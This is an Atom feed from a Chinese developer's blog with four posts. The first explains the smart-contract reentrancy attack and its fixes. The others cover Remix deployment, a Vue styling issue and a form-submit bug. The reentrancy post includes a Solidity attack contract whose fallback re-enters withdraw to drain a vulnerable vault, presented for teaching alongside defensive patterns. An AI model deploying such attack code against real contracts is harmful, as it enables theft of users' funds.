<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hoshino Bunny‘s Blog</title>
  <icon>https://minio.drivefly.cn:443/image-hoshino/blog/2024/11/25/hoshino48x48.png</icon>
  
  <link href="http://blog.hoshinobunny.xyz/atom.xml" rel="self"/>
  
  <link href="http://blog.hoshinobunny.xyz/"/>
  <updated>2025-03-12T10:05:22.512Z</updated>
  <id>http://blog.hoshinobunny.xyz/</id>
  
  <author>
    <name>HoshinoBunny</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>重入攻击</title>
    <link href="http://blog.hoshinobunny.xyz/2025/03/10/%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/"/>
    <id>http://blog.hoshinobunny.xyz/2025/03/10/%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/</id>
    <published>2025-03-10T10:04:52.000Z</published>
    <updated>2025-03-12T10:05:22.512Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是重入攻击？"><a href="#什么是重入攻击？" class="headerlink" title="什么是重入攻击？"></a>什么是重入攻击？</h1><p>重入攻击（Reentrancy Attack）是区块链智能合约中的一种常见安全漏洞，尤其在以太坊等支持智能合约的区块链平台中较为突出。它发生在<strong>一个合约在调用另一个合约（或地址）的函数时，未更新自身状态之前，对方合约又重新调用原合约的函数</strong>，从而导致逻辑被重复执行，进而被恶意利用。</p><h2 id="举一个经典例子"><a href="#举一个经典例子" class="headerlink" title="举一个经典例子"></a>举一个经典例子</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">contract Vulnerable &#123;</span><br><span class="line">    mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint amount = balances[msg.sender];</span><br><span class="line">        require(amount &gt; 0);</span><br><span class="line"></span><br><span class="line">        // 向用户发送 ETH</span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success);</span><br><span class="line"></span><br><span class="line">        // ⚠️ 问题在这里：在转账之后才修改状态</span><br><span class="line">        balances[msg.sender] = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面的攻击合约就能通过<code>fallback</code> 回调函数发起<code>重入攻击</code> 从而盗取<code>Vulnerable</code> 账户中的所有资金。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;./Vulnerable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    Vulnerable public vault;</span><br><span class="line"></span><br><span class="line">    constructor(address _vault) &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        vault = Vulnerable(payable(_vault));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">     function attack() public &#123;</span><br><span class="line">        vault.deposite&#123;value: 0.1 ether&#125;();</span><br><span class="line">        vault.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">// 通过回调函数发起重入攻击，盗取目标合约的所有资金</span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        if (address(vault).balance &gt; 0) &#123;</span><br><span class="line">            vault.withdraw();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        if (msg.sender == owner) &#123;</span><br><span class="line">            payable(msg.sender).transfer(address(this).balance);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当攻击者通过<code>Attack</code> 方法先向目标合约存入一笔资金，随后取款，在目标合约进行转账的时候使用<code>msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</code> 会调用到<code>Attack</code> 中的回调函数，而回调函数会再次调用取款函数，由于目标合约中的 <code>balances[msg.sender]</code> 在此时任然没有被修改为0，这就导致攻击者可以一直触发转账，直到账户中资金为0。</p><h1 id="如何解决？"><a href="#如何解决？" class="headerlink" title="如何解决？"></a>如何解决？</h1><h2 id="先修改状态变量"><a href="#先修改状态变量" class="headerlink" title="先修改状态变量"></a>先修改状态变量</h2><p>在取款函数中，先修改状态变量再进行转账操作即可防止重入攻击。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function withdraw() public &#123;</span><br><span class="line">    uint amount = balances[msg.sender];</span><br><span class="line">    require(amount &gt; 0);</span><br><span class="line"></span><br><span class="line">    balances[msg.sender] = 0; // ✅ 先修改状态</span><br><span class="line">    (bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">    require(success);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用互斥锁"><a href="#使用互斥锁" class="headerlink" title="使用互斥锁"></a>使用互斥锁</h2><p>在同一次交易调用中，对取款函数的状态加锁，如果攻击者试图在回调函数中再次调用取款函数，就会因为<code>locked</code> 变量无法重复调用。</p><p>openzeppelin已经给出<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuardTransient.sol">最佳实现</a>。</p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuardTransient.sol">https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuardTransient.sol</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bool internal locked;</span><br><span class="line">modifier noReentrant() &#123;</span><br><span class="line">    require(!locked, &quot;No reentrancy&quot;);</span><br><span class="line">    locked = true;</span><br><span class="line">    _;</span><br><span class="line">    locked = false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function withdraw() public noReentrant &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="限制调用方式（比如用-transfer-或-send-限制-gas）"><a href="#限制调用方式（比如用-transfer-或-send-限制-gas）" class="headerlink" title="限制调用方式（比如用 transfer 或 send 限制 gas）"></a><strong>限制调用方式（比如用 transfer 或 send 限制 gas）</strong></h1><p>不推荐长期使用这种方式，现在很多攻击已经绕过<code>gas</code>限制了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;什么是重入攻击？&quot;&gt;&lt;a href=&quot;#什么是重入攻击？&quot; class=&quot;headerlink&quot; title=&quot;什么是重入攻击？&quot;&gt;&lt;/a&gt;什么是重入攻击？&lt;/h1&gt;&lt;p&gt;重入攻击（Reentrancy Attack）是区块链智能合约中的一种常见安全漏洞，尤其在以</summary>
      
    
    
    
    <category term="Coding" scheme="http://blog.hoshinobunny.xyz/categories/Coding/"/>
    
    
    <category term="学习记录" scheme="http://blog.hoshinobunny.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    <category term="区块链" scheme="http://blog.hoshinobunny.xyz/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="Solidity" scheme="http://blog.hoshinobunny.xyz/tags/Solidity/"/>
    
    <category term="合约安全" scheme="http://blog.hoshinobunny.xyz/tags/%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>部署第一个合约</title>
    <link href="http://blog.hoshinobunny.xyz/2025/02/12/%E9%83%A8%E7%BD%B2%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%90%88%E7%BA%A6/"/>
    <id>http://blog.hoshinobunny.xyz/2025/02/12/%E9%83%A8%E7%BD%B2%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%90%88%E7%BA%A6/</id>
    <published>2025-02-12T10:04:48.000Z</published>
    <updated>2025-02-12T10:16:11.740Z</updated>
    
    <content type="html"><![CDATA[<h1 id="钱包转账"><a href="#钱包转账" class="headerlink" title="钱包转账"></a>钱包转账</h1><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2025/02/12/image.png" alt="image.png"></p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2025/02/12/image-20250212181221778.png" alt="image-20250212181221778"></p><h1 id="部署第一个合约"><a href="#部署第一个合约" class="headerlink" title="部署第一个合约"></a>部署第一个合约</h1><p>创建一个 <code>counter.sol</code> 文件，写入 <code>Solidity</code> 代码，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Counter &#123;</span><br><span class="line">    uint256 internal count = 0;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function get() public view returns (uint256) &#123;</span><br><span class="line">        return count;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function add(uint256 x) public &#123;</span><br><span class="line">        count += x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选择合适的编译器版本进行编译。</p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2025/02/12/image%202.png" alt="image.png"></p><p>在部署页面选择 <code>Injected Provider - MetaMask</code> ，这将使用MetaMask作为<code>Web3 Provider</code> ，可以通过MetaMask访问测试网。</p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2025/02/12/image%203.png" alt="image.png"></p><p>连接到MetaMask之后，选择部署合约的钱包账号地址，然后点击<code>Deploy</code> 发起交易进行部署。</p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2025/02/12/image%204.png" alt="image.png"></p><p>交易请求会自动打开MetaMask浏览器扩展进行确认。</p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2025/02/12/image%205.png" alt="image.png"></p><p>等待合约部署完成后就可以在Remix的控制台中看到交易信息。</p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2025/02/12/image-20250212181559399.png" alt="image-20250212181559399"></p><p>复制交易信息中的<code>transaction hash</code> ，在<strong>Sepolia</strong>的区块链浏览器中查询交易hash就能找到刚刚部署的合约信息（<a href="https://sepolia.etherscan.io/tx/0x7baea1a6d324c1b96c871bff86ff63ec911b850b46d8e27c21e38b1686c11ca7">https://sepolia.etherscan.io/tx/0x7baea1a6d324c1b96c871bff86ff63ec911b850b46d8e27c21e38b1686c11ca7</a>）。</p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2025/02/12/image%207.png" alt="image.png"></p><p>同样，在Remix中调用合约中的方法后也能通过交易信息中的<code>transaction hash</code> 查询到这笔交易信息（<a href="https://sepolia.etherscan.io/tx/0xa75bb7ffef438ac94c35a7a502bb3661f7fe278b2edcfa7bec9d7e4f5019dd37">https://sepolia.etherscan.io/tx/0xa75bb7ffef438ac94c35a7a502bb3661f7fe278b2edcfa7bec9d7e4f5019dd37</a>）。</p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2025/02/12/image%208.png" alt="image.png"></p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2025/02/12/image%209.png" alt="image.png"></p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2025/02/12/image%2010.png" alt="image.png"></p><p>只有调用修改数据的函数会产生gas费，直接调用只读取数据的函数（被<code>view/pure</code> 修饰的函数）是不会产生gas费用的。例如下图中调用的get()方法，没有产生gas消耗，也没有交易hash。</p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2025/02/12/image%2011.png" alt="image.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;钱包转账&quot;&gt;&lt;a href=&quot;#钱包转账&quot; class=&quot;headerlink&quot; title=&quot;钱包转账&quot;&gt;&lt;/a&gt;钱包转账&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://minio.drivefly.cn/image-hoshino/blog/2025/02</summary>
      
    
    
    
    <category term="Coding" scheme="http://blog.hoshinobunny.xyz/categories/Coding/"/>
    
    
    <category term="学习记录" scheme="http://blog.hoshinobunny.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    <category term="区块链" scheme="http://blog.hoshinobunny.xyz/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="Solidity" scheme="http://blog.hoshinobunny.xyz/tags/Solidity/"/>
    
  </entry>
  
  <entry>
    <title>v-deep的使用踩坑</title>
    <link href="http://blog.hoshinobunny.xyz/2025/01/04/v-deep%E7%9A%84%E4%BD%BF%E7%94%A8%E8%B8%A9%E5%9D%91/"/>
    <id>http://blog.hoshinobunny.xyz/2025/01/04/v-deep%E7%9A%84%E4%BD%BF%E7%94%A8%E8%B8%A9%E5%9D%91/</id>
    <published>2025-01-04T10:25:22.000Z</published>
    <updated>2025-01-04T10:25:25.587Z</updated>
    
    <content type="html"><![CDATA[<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>在同一个页面中，我使用<code>v-deep</code>设置了<code>input</code> 组件的<code>placeholder</code> 样式，让输入框从右往左输入，但是这导致<code>textarea</code> 组件的<code>placeholder</code> 样式也被修改了。当我单独设置<code>textarea</code> 的<code>placeholder</code> 样式时，<code>input</code> 中的样式也会相应被覆盖。</p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2025/01/04/image.png" alt="image.png"></p><p>这是自定义的<code>placeholder</code> 的样式：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">::<span class="built_in">v-deep</span>(.placeholder-text) &#123;</span><br><span class="line"><span class="attribute">font-family</span>: PingFangSC, PingFang SC;</span><br><span class="line"><span class="attribute">font-weight</span>: <span class="number">400</span>;</span><br><span class="line"><span class="attribute">font-size</span>: <span class="number">14px</span>;</span><br><span class="line"><span class="attribute">color</span>: <span class="number">#2C5181</span>;</span><br><span class="line"><span class="selector-tag">line</span>-<span class="attribute">height</span>: <span class="number">0</span>;</span><br><span class="line"><span class="selector-tag">text</span>-align: right;</span><br><span class="line"><span class="attribute">font-style</span>: normal;</span><br><span class="line"><span class="selector-tag">text</span>-<span class="attribute">transform</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><p>将需要修改样式的输入框再包一层就好了。修改后的样式如下：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.right-input</span> &#123;</span><br><span class="line">::<span class="built_in">v-deep</span>(.placeholder-text) &#123;</span><br><span class="line"><span class="attribute">font-family</span>: PingFangSC, PingFang SC;</span><br><span class="line"><span class="attribute">font-weight</span>: <span class="number">400</span>;</span><br><span class="line"><span class="attribute">font-size</span>: <span class="number">14px</span>;</span><br><span class="line"><span class="attribute">color</span>: <span class="number">#2C5181</span>;</span><br><span class="line"><span class="selector-tag">line</span>-<span class="attribute">height</span>: <span class="number">0</span>;</span><br><span class="line"><span class="selector-tag">text</span>-align: right;</span><br><span class="line"><span class="attribute">font-style</span>: normal;</span><br><span class="line"><span class="selector-tag">text</span>-<span class="attribute">transform</span>: none;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用<code>right-input</code> 样式将需要修改样式的输入框再包一层，这样就只会对<code>right-input</code> 样式下的输入框生效而不影响其他的输入框样式。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.cnblogs.com/131362wsc/p/16460652.html">https://www.cnblogs.com/131362wsc/p/16460652.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;问题&quot;&gt;&lt;a href=&quot;#问题&quot; class=&quot;headerlink&quot; title=&quot;问题&quot;&gt;&lt;/a&gt;问题&lt;/h1&gt;&lt;p&gt;在同一个页面中，我使用&lt;code&gt;v-deep&lt;/code&gt;设置了&lt;code&gt;input&lt;/code&gt; 组件的&lt;code&gt;placehold</summary>
      
    
    
    
    <category term="Coding" scheme="http://blog.hoshinobunny.xyz/categories/Coding/"/>
    
    
    <category term="踩坑" scheme="http://blog.hoshinobunny.xyz/tags/%E8%B8%A9%E5%9D%91/"/>
    
    <category term="Vue" scheme="http://blog.hoshinobunny.xyz/tags/Vue/"/>
    
    <category term="前端" scheme="http://blog.hoshinobunny.xyz/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>表单默认提交行为导致请求被取消</title>
    <link href="http://blog.hoshinobunny.xyz/2024/12/07/%E8%A1%A8%E5%8D%95%E9%BB%98%E8%AE%A4%E6%8F%90%E4%BA%A4%E8%A1%8C%E4%B8%BA%E5%AF%BC%E8%87%B4%E8%AF%B7%E6%B1%82%E8%A2%AB%E5%8F%96%E6%B6%88/"/>
    <id>http://blog.hoshinobunny.xyz/2024/12/07/%E8%A1%A8%E5%8D%95%E9%BB%98%E8%AE%A4%E6%8F%90%E4%BA%A4%E8%A1%8C%E4%B8%BA%E5%AF%BC%E8%87%B4%E8%AF%B7%E6%B1%82%E8%A2%AB%E5%8F%96%E6%B6%88/</id>
    <published>2024-12-07T14:33:38.000Z</published>
    <updated>2024-12-08T07:30:07.407Z</updated>
    
    <content type="html"><![CDATA[<h1 id="表单默认提交行为导致请求被取消"><a href="#表单默认提交行为导致请求被取消" class="headerlink" title="表单默认提交行为导致请求被取消"></a>表单默认提交行为导致请求被取消</h1><p>起因是最近接手的一个前端管理系统项目，这是个19年的老项目，技术栈就不必多说了，<code>jquery</code>+<code>layui</code> ，我看了直接傻眼，我曼波是个后端开发啊😭😭😭！！！终究是活成了自己最讨厌的样子。话又说回来，成为一名全栈er感觉也挺爽的，只是我不想接触这么一坨大杂烩的时代遗物。</p><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>打开模态框填写表单数据，然后点击按钮提交表单发起请求时发现预检<code>OPTION</code> 请求通过了，但是真正的请求却被取消了，随后整个页面自动刷新了，模态框也被关闭但没有触发任何回调函数弹出提示框。这个问题其实很基础，但我作为一名半路出家的前端，对这种场景没什么经验。</p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2024/12/07/image.png" alt="image.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 监听提交按钮点击事件</span></span><br><span class="line">$(<span class="string">&#x27;#submitAfterSale&#x27;</span>).<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> formElement = $(<span class="string">&#x27;#addAfterSaleForm&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> (formElement) &#123;</span><br><span class="line">    <span class="keyword">var</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>(formElement);</span><br><span class="line">    <span class="keyword">var</span> formObject = &#123;&#125;;</span><br><span class="line">    formData.<span class="title function_">forEach</span>(<span class="function">(<span class="params">value, key</span>) =&gt;</span> &#123;</span><br><span class="line">      formObject[key] = value;</span><br><span class="line">    &#125;);</span><br><span class="line">    admin.<span class="title function_">req</span>(&#123;</span><br><span class="line">      <span class="attr">url</span>: setter.<span class="property">sendUrl</span> + <span class="string">&#x27;/biz/order/after&#x27;</span>,</span><br><span class="line">      <span class="attr">type</span>: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">      <span class="attr">contentType</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">      <span class="attr">data</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(formObject),</span><br><span class="line">      <span class="attr">done</span>: <span class="keyword">function</span>(<span class="params">res</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (res.<span class="property">code</span> === <span class="number">200</span>) &#123;</span><br><span class="line">          layer.<span class="title function_">msg</span>(<span class="string">&#x27;提交成功&#x27;</span>, &#123;<span class="attr">icon</span>: <span class="number">1</span>, <span class="attr">time</span>: <span class="number">2000</span>&#125;);</span><br><span class="line">          layer.<span class="title function_">closeAll</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          layer.<span class="title function_">msg</span>(<span class="string">&#x27;提交失败&#x27;</span>, &#123;<span class="attr">icon</span>: <span class="number">2</span>, <span class="attr">time</span>: <span class="number">2000</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>我一开始甚至都没注意到这个请求是被取消了，还在想是不是跨域出了问题，，然后当我注意到这个东西的时候，我就google了一下，终于找到了出问题的原因。问题就出这个post请求还没有完成，这个按钮的dom元素就已经被删除了，所以请求也被浏览器取消了。</p><p>至于为什么会出现这种情况，这就得说说<code>button</code> 这个组件了。在html页面中，<code>button</code> 的<code>type</code> 属性有三个值，分别是<code>button</code> 、<code>submit</code> 、<code>reset</code> ，当<code>type</code> 属性设置为<code>submit</code> 时，点击按钮就会触发表单的默认提交行为。</p><p>所以这个场景下，点击提交按钮会触发两个请求，一个是表单的默认提交行为，它提交的URL由当前<code>form</code> 标签的<code>actoin</code> 属性设置（例如<code>&lt;form id=&quot;addAfterSaleForm&quot; action=&quot;/submit&quot; method=&quot;post&quot;&gt;</code>），如果没有设置，，则默认提交到当前页面的URL。另一个请求则是由JS脚本触发，向后端地址发起的请求。但是由于第一个提交到当前页面的请求已经完成触发页面刷新并关闭了模态框，而第二个请求是由ajax发起的异步请求，这就导致真正的请求还没有完成，刚刚触发请求的dom元素（即提交按钮）却已经被删除了，最后请求也就被浏览器取消了。</p><h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><p>解决办法倒是很简单，有两种办法。</p><p>一种是阻止表单的默认提交行为。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 监听提交按钮点击事件</span></span><br><span class="line">      $(<span class="string">&#x27;#submitAfterSale&#x27;</span>).<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="comment">// 阻止表单的默认提交行为</span></span><br><span class="line">        event.<span class="title function_">preventDefault</span>();</span><br><span class="line">        <span class="keyword">var</span> formElement = $(<span class="string">&#x27;#addAfterSaleForm&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (formElement) &#123;</span><br><span class="line">          <span class="keyword">var</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>(formElement);</span><br><span class="line">          <span class="keyword">var</span> formObject = &#123;&#125;;</span><br><span class="line">          formData.<span class="title function_">forEach</span>(<span class="function">(<span class="params">value, key</span>) =&gt;</span> &#123;</span><br><span class="line">            formObject[key] = value;</span><br><span class="line">          &#125;);</span><br><span class="line">          admin.<span class="title function_">req</span>(&#123;</span><br><span class="line">            <span class="attr">url</span>: setter.<span class="property">sendUrl</span> + <span class="string">&#x27;/biz/order/after&#x27;</span>,</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">            <span class="attr">contentType</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">            <span class="attr">data</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(formObject),</span><br><span class="line">            <span class="attr">done</span>: <span class="keyword">function</span>(<span class="params">res</span>) &#123;</span><br><span class="line">              <span class="keyword">if</span> (res.<span class="property">code</span> === <span class="number">200</span>) &#123;</span><br><span class="line">                layer.<span class="title function_">msg</span>(<span class="string">&#x27;提交成功&#x27;</span>, &#123;<span class="attr">icon</span>: <span class="number">1</span>, <span class="attr">time</span>: <span class="number">2000</span>&#125;);</span><br><span class="line">                layer.<span class="title function_">closeAll</span>();</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                layer.<span class="title function_">msg</span>(<span class="string">&#x27;提交失败&#x27;</span>, &#123;<span class="attr">icon</span>: <span class="number">2</span>, <span class="attr">time</span>: <span class="number">2000</span>&#125;);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br></pre></td></tr></table></figure><p>而另一种就是将<code>button</code> 的<code>type</code> 属性设置为普通的按钮<code>button</code> 。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;submitAfterSale&quot;</span> <span class="attr">class</span>=<span class="string">&quot;layui-btn&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">lay-filter</span>=<span class="string">&quot;submitAfterSale&quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://juejin.cn/post/6844904045480509447">https://juejin.cn/post/6844904045480509447</a></p><p><a href="https://developer.aliyun.com/article/1152493">https://developer.aliyun.com/article/1152493</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;表单默认提交行为导致请求被取消&quot;&gt;&lt;a href=&quot;#表单默认提交行为导致请求被取消&quot; class=&quot;headerlink&quot; title=&quot;表单默认提交行为导致请求被取消&quot;&gt;&lt;/a&gt;表单默认提交行为导致请求被取消&lt;/h1&gt;&lt;p&gt;起因是最近接手的一个前端管理系统项目</summary>
      
    
    
    
    <category term="Coding" scheme="http://blog.hoshinobunny.xyz/categories/Coding/"/>
    
    
    <category term="踩坑" scheme="http://blog.hoshinobunny.xyz/tags/%E8%B8%A9%E5%9D%91/"/>
    
